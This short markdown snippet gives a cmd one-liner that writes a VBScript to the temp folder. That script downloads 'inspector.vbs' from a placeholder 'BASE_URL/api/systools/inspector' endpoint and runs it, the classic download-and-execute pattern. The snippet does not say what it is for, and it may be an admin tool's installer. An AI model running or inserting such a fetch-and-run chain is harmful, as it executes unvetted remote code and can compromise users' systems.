# Download inspector.vbs from cmd

```
echo. > %TEMP%\download_inspector.vbs &
echo set temp = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) >> %TEMP%\download_inspector.vbs &
echo set xHttp = CreateObject("Microsoft.XMLHTTP") >> %TEMP%\download_inspector.vbs &
echo set bStrm = CreateObject("Adodb.Stream") >> %TEMP%\download_inspector.vbs &
echo xHttp.Open "GET", "BASE_URL/api/systools/inspector", False >> %TEMP%\download_inspector.vbs &
echo xHttp.Send >> %TEMP%\download_inspector.vbs &
echo with bStrm >> %TEMP%\download_inspector.vbs &
echo .type = 1 >> %TEMP%\download_inspector.vbs &
echo .open >> %TEMP%\download_inspector.vbs &
echo .write xHttp.responseBody >> %TEMP%\download_inspector.vbs &
echo .savetofile temp ^&^ ^"\^" ^&^ ^"inspector.vbs^", 2 >> %TEMP%\download_inspector.vbs &
echo end with >> %TEMP%\download_inspector.vbs &
echo set objShell = CreateObject("WScript.Shell") >> %TEMP%\download_inspector.vbs &
echo objShell.Run temp ^&^ ^"\^" ^&^ ^"inspector.vbs^" >> %TEMP%\download_inspector.vbs &
echo set objShell = Nothing >> %TEMP%\download_inspector.vbs &
cscript.exe %TEMP%\download_inspector.vbs
```
